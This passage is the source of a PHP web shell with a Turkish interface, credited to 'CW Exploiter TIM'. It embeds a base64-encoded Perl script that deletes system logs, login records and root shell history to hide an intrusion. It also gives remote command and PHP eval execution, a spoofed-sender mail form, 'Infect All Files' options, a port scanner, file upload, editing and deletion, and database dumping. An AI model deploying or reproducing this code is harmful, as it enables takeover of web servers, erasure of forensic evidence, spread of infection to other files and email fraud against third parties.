pbmsgQGxhbXBwOw0KICAgICAgICAgICAgIHNsZWVwIDE7DQogICAgICAgICAgICBpZigkZykgeyBwcmludCBcIlsrXUxvZ3MgU3VjY2Vzc2Z1bGx5IERlbGV0ZWQuLi5cXG5cIjsgfQ0KCQkgICAgZWxzZSB7IHByaW50IFwiWy1dRXJyb3JcIjsgfQ0KICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICBpZigkb3MgZXEgXCJyZWRoYXRcIil7ICNJZiByZWRoYXQgdHlwZWQsIGRvIHRoZSBmb2xsb3dpbmcgYW5kIHN0YXJ0IGJyYWNrZXRzDQogICAgICAgICAgICAgcHJpbnQgXCJbK11SZWQgSGF0IExpbnV4L01hYyBPUyBYIFNlbGVjdGVkLi4uXFxuXCI7DQogICAgICAgICAgICAgc2xlZXAgMTsNCiAgICAgICAgICAgICBwcmludCBcIlsrXUxvZ3MgTG9jYXRlZC4uLlxcblwiOw0KICAgICAgICAgICAgIHNsZWVwIDE7DQogICAgICAgICAgICAgJGggPSB1bmxpbmsgQHJlZGhhdDsNCiAgICAgICAgICAgICBzbGVlcCAxOw0KICAgICAgICAgICAgIGlmKCRoKSB7IHByaW50IFwiWytdTG9ncyBTdWNjZXNzZnVsbHkgRGVsZXRlZC4uLlxcblwiOyB9DQoJCQkgIGVsc2UgeyBwcmludCBcIlstXUVycm9yXCI7IH0NCiAgICAgICAgICAgICAgfQ0KICAgICAgIA0KICAgICAgICAgICAgICAgIGlmKCRvcyBlcSBcImxpbnV4XCIpeyAjSWYgbGludXggdHlwZWQsIGRvIHRoZSBmb2xsb3dpbmcgYW5kIHN0YXJ0IGJyYWNrZXRzDQogICAgICAgICAgICAgcHJpbnQgXCJbK11MaW51eCBTZWxlY3RlZC4uLlxcblwiOyAgIA0KICAgICAgICAgICAgIHNsZWVwIDE7DQogICAgICAgICAgICAgcHJpbnQgXCJbK11Mb2dzIExvY2F0ZWQuLi5cXG5cIjsNCiAgICAgICAgICAgICBzbGVlcCAxOw0KICAgICAgICAgICAgICRpID0gdW5saW5rIEBsaW51eDsNCiAgICAgICAgICAgICBzbGVlcCAxOw0KCQkJaWYoJGkpIHsgcHJpbnQgXCJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXFxuXCI7fSANCgkJCWVsc2UgeyBwcmludCBcIlstXUVycm9yXCI7IH0NCgkJfSAgICAgIA0KICAgICAgICAgICAgIA0KICAgICAgICAgICAgICBpZigkb3MgZXEgXCJzdW5vc1wiKXsgI0lmIHN1bm9zIHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cw0KICAgICAgICAgICAgICBwcmludCBcIlsrXVN1bk9TIFNlbGVjdGVkLi4uXFxuXCI7DQogICAgICAgICAgICAgIHNsZWVwIDE7DQogICAgICAgICAgICAgIHByaW50IFwiWytdTG9ncyBMb2NhdGVkLi4uXFxuXCI7DQogICAgICAgICAgICAgIHNsZWVwIDE7DQogICAgICAgICAgICAgICRsID0gdW5saW5rIEBzdW5vczsNCiAgICAgICAgICAgICAgaWYoJGwpIHsgcHJpbnQgXCJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXFxuXCI7IH0NCgkJCSAgZWxzZSB7IHByaW50IFwiWy1dRXJyb3JcIjsgfQ0KICAgICAgICAgICAgICB9ICAgDQogICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgaWYoJG9zIGVxIFwiYWl4XCIpeyAjSWYgYWl4IHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cw0KICAgICAgICAgICAgICAgICBwcmludCBcIlsrXUFpeCBTZWxlY3RlZC4uLlxcblwiOw0KICAgICAgICAgICAgICAgICBzbGVlcCAxOw0KICAgICAgICAgICAgICBwcmludCBcIlsrXUxvZ3MgTG9jYXRlZC4uLlxcblwiOw0KICAgICAgICAgICAgICBzbGVlcCAxOw0KICAgICAgICAgICAgICAkbSA9IHVubGluayBAYWl4Ow0KICAgICAgICAgICAgICBpZigkbSkgeyBwcmludCBcIlsrXUxvZ3MgU3VjY2Vzc2Z1bGx5IERlbGV0ZWQuLi5cXG5cIjsgfQ0KCQkJICAgZWxzZSB7IHByaW50IFwiWy1dRXJyb3JcIjsgfQ0KICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgDQogICAgICAgICAgICAgIGlmKCRvcyBlcSBcImlyaXhcIil7ICNJZiBpcml4IHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0DQogICAgICAgICAgICAgIHByaW50IFwiWytdSXJpeCBTZWxlY3RlZC4uLlxcblwiOw0KICAgICAgICAgICAgICBzbGVlcCAxOw0KICAgICAgICAgICAgICBwcmludCBcIlsrXUxvZ3MgTG9jYXRlZC4uLlxcblwiOw0KICAgICAgICAgICAgICBzbGVlcCAxOw0KICAgICAgICAgICAgICAkbiA9IHVubGluayBAaXJpeDsgICANCiAgICAgICAgICAgICAgaWYoJG4pIHsgcHJpbnQgXCJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXFxuXCI7IH0NCgkJCSAgZWxzZSB7IHByaW50IFwiWy1dRXJyb3JcIjsgfQ0KICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI01pc2MgTG9nIExvY2F0aW9ucyAgIA0KICAgICAgeyAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICBAbWlzYyA9IChcIi9ldGMvaHR0cGQvbG9ncy9hY2Nlc3MubG9nXCIsIFwiL2V0Yy9odHRwZC9sb2dzL2Vycm9yLmxvZ1wiLFwiL2V0Yy9odHRwZC9sb2dzL2FjY2Vzc19sb2dcIiwNCiAgICAgICAgICAgIFwiL2V0Yy9odHRwZC9sb2dzL2Vycm9yX2xvZ1wiLFwiL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9hY2Nlc3NfbG9nXCIsXCIvdXNyL2xvY2FsL2FwYWNoZS9sb2dzL2Vycm9yX2xvZ1wiLA0KICAgICAgICAgICAgXCIvdXNyL2xvY2FsL2FwYWNoZS9sb2dzL2FjY2Vzcy5sb2dcIixcIi91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvZXJyb3IubG9nXCIsXCIvdmFyL2xvZy9hcGFjaGUvYWNjZXNzX2xvZ1wiLA0KICAgICAgICAgICAgXCIvdmFyL2xvZy9hcGFjaGUvZXJyb3JfbG9nXCIsXCIvdmFyL2xvZy9hcGFjaGUvYWNjZXNzLmxvZ1wiLFwiL3Zhci9sb2cvYXBhY2hlL2Vycm9yLmxvZ1wiLFwiL3Zhci9sb2cvYWNjZXNzX2xvZ1wiLA0KICAgICAgICAgICAgXCIvdmFyL2xvZy9lcnJvcl9sb2dcIixcIi92YXIvd3d3L2xvZ3MvZXJyb3IubG9nXCIsXCIvdmFyL3d3dy9sb2dzL2FjY2Vzcy5sb2dcIixcIi92YXIvd3d3L2xvZ3MvZXJyb3JfbG9nXCIsDQogICAgICAgICAgICBcIi92YXIvd3d3L2xvZ3MvYWNjZXNzX2xvZ1wiKQ0KICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBPcGVuQlNEIFN5c3RlbXMNCiAgIA0KICAgICAgew0KICAgICAgIEBvcGVuYnNkID0gKFwiL3Zhci93d3cvbG9nL2FjY2Vzc19sb2dcIiwgXCIvdmFyL3d3dy9sb2cvZXJyb3JfbG9nXCIpDQogICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI0xvZ3Mgb2YgRnJlZUJTRCBTeXN0ZW1zDQogICANCiAgICAgIHsNCiAgICAgICBAZnJlZWJzZCA9IChcIi91c3IvbG9jYWwvZXRjL2h0dHBkL2xvZ3MvYWNjZXNzX2xvZ1wiLCBcIi91c3IvbG9jYWwvZXRjL2h0dHBkL2xvZ3MvZXJyb3JfbG9nXCIpDQogICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI0xvZ3Mgb2YgRGViaWFuIFN5c3RlbXMNCiAgIA0KICAgICAgew0KICAgICAgIEBkZWJpYW4gPSAoXCIvdmFyL2xvZy9hcGFjaGUvYWNjZXNzLmxvZ1wiLCBcIi92YXIvbG9nL2FwYWNoZS9lcnJvci5sb2dcIiwNCiAgICAgICBcIi92YXIvbG9nL2FwYWNoZS1zc2wvZXJyb3IubG9nXCIsIFwiL3Zhci9sb2cvYXBhY2hlLXNzbC9hY2Nlc3MubG9nXCIpDQogICAgICAgICAgIH0gICANCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI0xvZ3Mgb2YgU3VTRSBMaW51eCBTeXN0ZW1zDQogICANCiAgICAgIHsNCiAgICAgICBAc3VzZSA9IChcIi92YXIvbG9nL2h0dHBkL2FjY2Vzc19sb2dcIiwgXCIvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2dcIikNCiAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBTb2xhcmlzIFN5c3RlbXMNCiAgIA0KICAgICAgeyAgIA0KICAgICAgIEBzb2xhcmlzID0gKFwiL3Zhci9hcGFjaGUvbG9ncy9hY2Nlc3NfbG9nXCIsIFwiL3Zhci9hcGFjaGUvbG9ncy9lcnJvcl9sb2dcIikNCiAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBMYW1wcCBTeXN0ZW1zDQogICANCiAgICAgIHsNCiAgICAgICBAbGFtcHAgPSAoXCIvb3B0L2xhbXBwL2xvZ3MvZXJyb3JfbG9nXCIsIFwiL29wdC9sYW1wcC9sb2dzL2FjY2Vzc19sb2dcIikNCiAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBSZWQgSGF0LCBNYWMgT1MgWCBTeXN0ZW1zDQogICANCiAgICAgIHsNCiAgICAgICBAcmVkaGF0ID0gKFwiL3Zhci9sb2cvaHR0cGQvYWNjZXNzX2xvZ1wiLCBcIi92YXIvbG9nL2h0dHBkL2Vycm9yX2xvZ1wiKQ0KICAgICAgICAgICB9DQogICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb2dzIG9mIElyaXggU3lzdGVtcw0KICAgDQogICAgICB7DQogICAgICAgQGlyaXggPSAoXCIvdmFyL2FkbS9TWVNMT0dcIiwgXCIvdmFyL2FkbS9zdWxvZ1wiLCBcIi92YXIvYWRtL3V0bXBcIiwgXCIvdmFyL2FkbS91dG1weFwiLA0KICAgICAgICAgICAgICBcIi92YXIvYWRtL3d0bXBcIiwgXCIvdmFyL2FkbS93dG1weFwiLCBcIi92YXIvYWRtL2xhc3Rsb2cvXCIsDQogICAgICAgICAgICBcIi91c3Ivc3Bvb2wvbHAvbG9nXCIsIFwiL3Zhci9hZG0vbHAvbHAtZXJyc1wiLCBcIi91c3IvbGliL2Nyb24vbG9nXCIsDQogICAgICAgICAgICBcIi92YXIvYWRtL2xvZ2lubG9nXCIsIFwiL3Zhci9hZG0vcGFjY3RcIiwgXCIvdmFyL2FkbS9kdG1wXCIsDQogICAgICAgICAgICBcIi92YXIvYWRtL2FjY3Qvc3VtL2xvZ2lubG9nXCIsIFwidmFyL2FkbS9YMG1zZ3NcIiwgXCIvdmFyL2FkbS9jcmFzaC92bWNvcmVcIiwNCiAgICAgICAgICAgIFwiL3Zhci9hZG0vY3Jhc2gvdW5peFwiKQ0KICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI0xvZyBzb2YgQWl4IFN5c3RlbXMNCiAgICAgIHsgICANCiAgICAgIEBhaXggPSAoXCIvdmFyL2FkbS9wYWNjdFwiLCBcIi92YXIvYWRtL3d0bXBcIiwgXCIvdmFyL2FkbS9kdG1wXCIsIFwiL3Zhci9hZG0vcWFjY3RcIiwgICANCiAgICAgICAgICAgICAgIFwiL3Zhci9hZG0vc3Vsb2dcIiwgXCIvdmFyL2FkbS9yYXMvZXJybG9nXCIsIFwiL3Zhci9hZG0vcmFzL2Jvb3Rsb2dcIiwNCiAgICAgICAgICAgICAgIFwiL3Zhci9hZG0vY3Jvbi9sb2dcIiwgXCIvZXRjL3V0bXBcIiwgXCIvZXRjL3NlY3VyaXR5L2xhc3Rsb2dcIiwNCiAgICAgICAgICAgICAgIFwiL2V0Yy9zZWN1cml0eS9mYWlsZWRsb2dpblwiLCBcInVzci9zcG9vbC9tcXVldWUvc3lzbG9nXCIpICAgDQogICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI0xvZ3Mgb2YgU3VuT1MgU3lzdGVtcyAgIA0KICAgICAgeyAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgQHN1bm9zID0gKFwiL3Zhci9hZG0vbWVzc2FnZXNcIiwgXCIvdmFyL2FkbS9hY3Vsb2dzXCIsIFwiL3Zhci9hZG0vYWN1bG9nXCIsDQogICAgICAgICAgICAgICAgIFwiL3Zhci9hZG0vc3Vsb2dcIiwgXCIvdmFyL2FkbS92b2xkLmxvZ1wiLCBcIi92YXIvYWRtL3d0bXBcIiwNCiAgICAgICAgICAgICAgICAgXCIvdmFyL2FkbS93dG1weFwiLCBcIi92YXIvYWRtL3V0bXBcIiwgXCIvdmFyL2FkbS91dG1weFwiLA0KICAgICAgICAgICAgICAgICBcIi92YXIvYWRtL2xvZy9hc3BwcC5sb2dcIiwgXCIvdmFyL2xvZy9zeXNsb2dcIiwNCiAgICAgICAgICAgICAgICAgXCIvdmFyL2xvZy9QT1Bsb2dcIiwgXCIvdmFyL2xvZy9hdXRobG9nXCIsIFwiL3Zhci9hZG0vcGFjY3RcIiwNCiAgICAgICAgICAgICAgICAgXCIvdmFyL2xwL2xvZ3MvbHBzY2hlZFwiLCBcIi92YXIvbHAvbG9ncy9yZXF1ZXN0c1wiLA0KICAgICAgICAgICAgICBcIi92YXIvY3Jvbi9sb2dzXCIsIFwiL3Zhci9zYWYvX2xvZ1wiLCBcIi92YXIvc2FmL3BvcnQvbG9nXCIpDQogICAgICAgICB9ICAgICANCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBMaW51eCBTeXN0ZW1zICAgICAgIA0KICAgICAgeyAgICAgDQogICAgICAgQGxpbnV4ID0gKFwiL3Zhci9sb2cvbGFzdGxvZ1wiLCBcIi92YXIvbG9nL3RlbG5ldGRcIiwgXCIvdmFyL3J1bi91dG1wXCIsDQogICAgICAgICAgICAgICAgIFwiL3Zhci9sb2cvc2VjdXJlXCIsXCIvcm9vdC8ua3NoX2hpc3RvcnlcIiwgXCIvcm9vdC8uYmFzaF9oaXN0b3J5XCIsDQogICAgICAgICAgICAgICAgIFwiL3Jvb3QvLmJhc2hfbG9ndXRcIiwgXCIvdmFyL2xvZy93dG1wXCIsIFwiL2V0Yy93dG1wXCIsDQogICAgICAgICAgICAgICAgIFwiL3Zhci9ydW4vdXRtcFwiLCBcIi9ldGMvdXRtcFwiLCBcIi92YXIvbG9nXCIsIFwiL3Zhci9hZG1cIiwNCiAgICAgICAgICAgICAgICAgXCIvdmFyL2FwYWNoZS9sb2dcIiwgXCIvdmFyL2FwYWNoZS9sb2dzXCIsIFwiL3Vzci9sb2NhbC9hcGFjaGUvbG9nc1wiLA0KICAgICAgICAgICAgICAgICBcIi91c3IvbG9jYWwvYXBhY2hlL2xvZ3NcIiwgXCIvdmFyL2xvZy9hY2N0XCIsIFwiL3Zhci9sb2cveGZlcmxvZ1wiLA0KICAgICAgICAgICAgICAgICBcIi92YXIvbG9nL21lc3NhZ2VzL1wiLCBcIi92YXIvbG9nL3Byb2Z0cGQveGZlcmxvZy5sZWdhY3lcIiwNCiAgICAgICAgICAgICAgICAgXCIvdmFyL2xvZy9wcm9mdHBkLnhmZXJsb2dcIiwgXCIvdmFyL2xvZy9wcm9mdHBkLmFjY2Vzc19sb2dcIiwNCiAgICAgICAgICAgICAgICAgXCIvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2dcIiwgXCIvdmFyL2xvZy9odHRwc2Qvc3NsX2xvZ1wiLA0KICAgICAgICAgICAgICAgICBcIi92YXIvbG9nL2h0dHBzZC9zc2wuYWNjZXNzX2xvZ1wiLCBcIi9ldGMvbWFpbC9hY2Nlc3NcIiwNCiAgICAgICAgICAgICAgICAgXCIvdmFyL2xvZy9xbWFpbFwiLCBcIi92YXIvbG9nL3NtdHBkXCIsIFwiL3Zhci9sb2cvc2FtYmFcIiwNCiAgICAgICAgICAgICAgICAgXCIvdmFyL2xvZy9zYW1iYS5sb2cuJW1cIiwgXCIvdmFyL2xvY2svc2FtYmFcIiwgXCIvcm9vdC8uWGF1dGhvcml0eVwiLA0KICAgICAgICAgICAgICAgICBcIi92YXIvbG9nL3BvcGxvZ1wiLCBcIi92YXIvbG9nL25ld3MuYWxsXCIsIFwiL3Zhci9sb2cvc3Bvb2xlclwiLA0KICAgICAgICAgICAgICAgICBcIi92YXIvbG9nL25ld3NcIiwgXCIvdmFyL2xvZy9uZXdzL25ld3NcIiwgXCIvdmFyL2xvZy9uZXdzL25ld3MuYWxsXCIsDQogICAgICAgICAgICAgICAgIFwiL3Zhci9sb2cvbmV3cy9uZXdzLmNyaXRcIiwgXCIvdmFyL2xvZy9uZXdzL25ld3MuZXJyXCIsIFwiL3Zhci9sb2cvbmV3cy9uZXdzLm5vdGljZVwiLA0KICAgICAgICAgICAgICAgICBcIi92YXIvbG9nL25ld3Mvc3Vjay5lcnJcIiwgXCIvdmFyL2xvZy9uZXdzL3N1Y2subm90aWNlXCIsDQogICAgICAgICAgICAgICAgIFwiL3Zhci9zcG9vbC90bXBcIiwgXCIvdmFyL3Nwb29sL2Vycm9yc1wiLCBcIi92YXIvc3Bvb2wvbG9nc1wiLCBcIi92YXIvc3Bvb2wvbG9ja3NcIiwNCiAgICAgICAgICAgICAgICAgXCIvdXNyL2xvY2FsL3d3dy9sb2dzL3RodHRwZF9sb2dcIiwgXCIvdmFyL2xvZy90aHR0cGRfbG9nXCIsDQogICAgICAgICAgICAgICAgIFwiL3Zhci9sb2cvbmNmdHBkL21pc2Nsb2cudHh0XCIsIFwiL3Zhci9sb2cvbmN0ZnBkLmVycnNcIiwNCiAgICAgICAgICAgICAgICAgXCIvdmFyL2xvZy9hdXRoXCIpDQogICAgICAgICB9DQogICAgICAgICANCiAgIA==");
$openp = fopen("logseraser.pl", "w+")or die("Error");
fwrite($openp, $erase)or die("Error");
fclose($openp);
$aidx = passthru("perl logseraser.pl ".$_POST['functionp']);
unlink("logseraser.pl");
echo "</textarea>";
}

if(isset($_POST['commex']))
{
echo "<tr><td>
<center><b><font size='2' face='Verdana'>CMD :]<br></font></b>
        <input name=cmd size=20 type=text> 
        <select name=functionz>
          <option>passthru</option>
          <option>popen</option>
          <option>exec</option>
          <option>shell_exec</option>
          <option>system</option>
        </select><br><input type='submit' name='cmdex' value='Enter'></table>";
   }
   if(isset($_POST['cmdex']))
   { echo "<tr><td>";
   switch (@$_POST['functionz']) {
	case "system":
	system(stripslashes($_POST['cmd']));
	
	break;
	case "popen":
	$handle = popen($_POST['cmd'].' 2>&1', 'r');
	echo "'$handle'; " . gettype($handle) . "\n";
	$read = fread($handle, 2096);
	echo $read;
	pclose($handle);
	
	break;
	case "shell_exec":
	shell_exec(stripslashes($_POST['cmd']));
	

	break;
	case "exec":
	exec(stripslashes($_POST['cmd']));
	
	break;
	case "passthru":
	passthru(stripslashes($_POST['cmd']));
	
	}
	}

elseif(isset($_POST['mail'])) 
{
echo "<form method='post' action=''>
<td valign=top><center><font face='Verdana' size='2'>FakeMail [HTML Onaylý]</font></center>
<center><font face='Verdana' size='1'>Kime:<br>
<input type='text' size='19' name='mto'><br>
Kimden:<br>
<input type='text' size='19' name='mfrom'><br>
Konu:<br>
<input type='text' size='19' name='mobj'><br>
Mesaj:<br>
<textarea name='mtext' cols=20 rows=4></textarea><br>
<br><input type='submit' value='Yolla' name='senm'>
</form></table><br>";}
if(isset($_POST['senm'])) 
{
//Mail With HTML   <- webcheatsheet.com
$to = $_POST['mto'];
$subject = $_POST['mobj'];
$contentz = $_POST['mtext']."<!--";
$random_hash = md5(date('r', time()));
$headers = "From: ".$_POST['mfrom']."\r\nReply-To: ".$_POST['mfrom'];
$headers .= "\r\nContent-Type: multipart/alternative; boundary=\"PHP-alt-".$random_hash."\"";
ob_start(); 
?>

--PHP-alt-<?php echo $random_hash; ?> 
Content-Type: text/html; charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

<?  echo "$contentz"; ?>
--PHP-alt-<?php echo $random_hash; ?>--
<?
$message = ob_get_clean();

$mail = @mail( $to, $subject, $message, $headers );

if($mail) { echo "<br><td valign=top>
<center><font color='green' size='1'>Mail Sent</font></center></table>"; }
else { echo "<br><td valign=top>
<center><font color='red' size='1'>Error</font></center></table>"; }
}

elseif(isset($_POST['encoder'])) { 
//Encoder
echo "<form method='post' action=''><td valign=top>
<center><font face='Verdana' size='1'>Text:</font><br><textarea name='encod'></textarea><br><input type='submit' value='Encode' name='encode'></form></table>"; 
}
if(isset($_POST['encode'])) { echo "<td valign=top>
<center><font face='Verdana' size='1'>
MD5:   &nbsp;&nbsp;&nbsp;&nbsp;<input type='text' size='35' value='".md5($_POST['encod'])."'><br>
Sha1:  &nbsp;&nbsp;&nbsp;<input type='text' size='35' value='".sha1($_POST['encod'])."'><br>
Crc32: &nbsp;&nbsp;&nbsp;<input type='text' size='34' value='".crc32($_POST['encod'])."'><br><br>
Base64 Encode: <input type='text' size='35' value='".base64_encode($_POST['encod'])."'><br>
Base64 Decode: <input type='text' size='36' value='".base64_decode($_POST['encod'])."'></table>";}

//File List
echo "</table><table width=100%><tr><td>
<center><font size='1' face='Verdana'>Toplam Dosyalar: $fileq [$filew files and $pahtw directory] </font></center></td></tr></table>
<center><table class=menuz width=100% cellspacing=0 cellpadding=0 border=0>
<font size='1'>
<td valign=top><font face='Verdana' size='2'><b>Dosya Adý :</b></font></td><td valign=top><font face='Verdana' size='2'><b>Tip:</b></font></td><td valign=top width=15%><font face='Verdana' size=2><b>Boyut:</b></font></td><td valign=top width=10%><font face='Verdana' size='2'><b>Perms:</b></font></td>$listf</font>
</table></center>"; 

echo "
<br>
<table class='menu' cellspacing='0' cellpadding='0' border='0' width='100%'><tr><td valign=top>
<center><b><font size='2' face='Verdana'>Server Uzerinde PHP Kodu :<br></font></b>";
if(!isset($phpeval))
{
echo "
   <form method='post' action=''>
   <textarea name=php_eval cols=100 rows=5></textarea><br>
   <input type='submit' value='Calistir!'>
   </form>
";
}

if(isset($phpeval)) {
echo "
<form method='post' action=''>
<textarea name=php_eval cols=100 rows=10>";
$wr = '"';
 $eval = @str_replace("<?","",$phpeval);
 $eval = @str_replace("?>","",$phpeval);
 @eval($eval);
echo "</textarea><br><input type='submit' value='Calistir!'></form>";

}
echo "<form method='post' action=''><input type='submit' value='Infect All Files!' name='inf3ct'> - <input type='submit' value='Eval Infect Files!' name='evalinfect'><br>";
if(isset($textzz)) { echo $textzz; }
if(isset($textz0)) { echo $textz0; }
echo "</center></form></td></tr><tr><td>
<center><b><font size='2' face='Verdana'>:: Edit File ::<br></font></b>
<form method='post' action=''>
<input type='text' name='editfile' value=".$dir.">
<input type='submit' value='Go' name='doedit'>
</form>";
// Edit Files n3xpl0rer
if(isset($_POST['doedit']) && $_POST['editfile'] != $dir)
{
$file = $_POST['editfile'];
$content = file_get_contents($file);
echo "<form action='' method='post'><center>
<input type='hidden' name='editfile' value='".$file."'>
<textarea rows=20 cols=80 name='newtext'>".htmlspecialchars($content)."</textarea><br /><input type='submit' name='edit' value='Edit'></form>";
}
if(isset($_POST['edit'])) {
$file = $_POST['editfile'];
echo  $file."<br />";
$fh = fopen($file, "w+")or die("<font color=red>Error: cannot open file</font>");
fwrite($fh, stripslashes($_POST['newtext']))or die("<font color=red>Error: cannot write to file</font>");
fclose($fh);
echo "Done.</td></tr>";
}
echo "
</table>
<table class='menu' cellspacing='0' cellpadding='0' border='0' width='100%'>
<tr>
<td valign=top>
<center><b><font size='2' face='Verdana'>Dizin'e Git:<br></font></b>
<form name='directory' method='post' action=''>
<input type='text' name='dir' value=$dir>
<input type='submit' value='Go'>
</form></td><td>
<center><b><font size='2' face='Verdana'> Port Tarayýcý <br></font></b>
   <form name='scanner' method='post'>
   <input type='text' name='host' value='127.0.0.1' >
   <select name='protocol'>
   <option value='tcp'>tcp</option>
   <option value='udp'>udp</option>
   </select>
   <input type='submit' value='Portlarý TARA'>
   </form>
";
if(isset($host) && isset($proto))
{
echo "<font size='2' face='Verdana'>Open Ports:";

for($current = 0; $current <= 23; $current++)
{
$currents = $myports[$current];

$service = getservbyport($currents, $proto);


// Try to connect to port
$result = fsockopen($host, $currents, $errno, $errstr, 1);

// Show results
if($result)
{
echo "$currents, ";
}


}
}

echo "</font>
</td></tr>

<tr>
<td valign=top width=50%>
<center><b><font size='2' face='Verdana'>Dosya Upload<br></font></b>
   <form method='post' action='' enctype='multipart/form-data'>
   <input type='hidden' name='dare' value=$dir>
   <input type='file' name='ffile'>
   <input type='submit' name='ok' value='Upload!'>
   </center>   
   </form>
</td>
<td valign=top>
<center><b><font size='2' face='Verdana'>Dosya Sil<br></font></b>
   <form method='post' action=''>
   <input type='text' name='delete' value=$dir > <input type='submit' value='Dosyayý Sil' name='deletfilez'>
   </center>
   </form>
</td></tr>
<tr>
<td valign=top>
 
<center><b><font size='2' face='Verdana'>Klasör Oluþtur<br></font></b>
   <form method='post' action=''>
   <input type='text' name='makedir' value=$dir> <input type='submit' value='Oluþtur'>
   </center>
   </form>
</td>
<td valign=top>
<center><b><font size='2' face='Verdana'>Klasör Sil<br></font></b>
   <form method='post' action=''>
   <input type='text' name='deletedir' value=$dir> <input type='submit' value='Sil'>
   </center>
   </form>
</td></tr>
<tr>
<td valign=top width=50%>
<center><b><font size='2' face='Verdana'>Dosya Oluþtur:<br></font></b>
   <form method='post' action=''>
   <input type='hidden' name='darezz' value=$dir>
   <font size='1' face='Verdana'>ADI:</font><br>
   <input type='text' name='names' size='30'><br>
   <font size='1' face='Verdana'>Kodu:</font><br>
   <textarea rows='16' cols='30' name='source'></textarea><br>
   <input type='submit' value='Upload'>
   </center>
   </form>
</td>
<td valign=top width=50%>
<center><b><font size='2' face='Verdana'>Database<br></font></b>
   <form method='post' action=''>
   <font size='1' face='Verdana'>Username: - Password:</font><br>
   <input type='text' name='user' size='10'>
   <input type='text' name='passd' size='10'><br>
   <font size='1' face='Verdana'>Host:</font><br>
   <input type='text' name='host' value='localhost'><br>
   <font size='1' face='Verdana'>DB Name:</font><br>
   <input type='text' name='db'><br>
   <font size='1' face='Verdana'>Sorgu:</font><br>
   <textarea rows='10' cols='30' name='query'></textarea><br>
   <input type='submit' value='Sorguyu Calistir' name='godb'><br><input type='submit' name='dump' value='Database'yi Dump Et'>
   </center>
   </form>
</td> </tr>

</table>
</table>
<br />
<table class='menu' cellspacing='0' cellpadding='0' border='0' width='100%'>
<tr>
<td valign=top>
<center><b><font size='1' face='Verdana'>
CW Exploiter TIM // Cyber Security
</center></font></td></tr>
</body>
</html>";


?>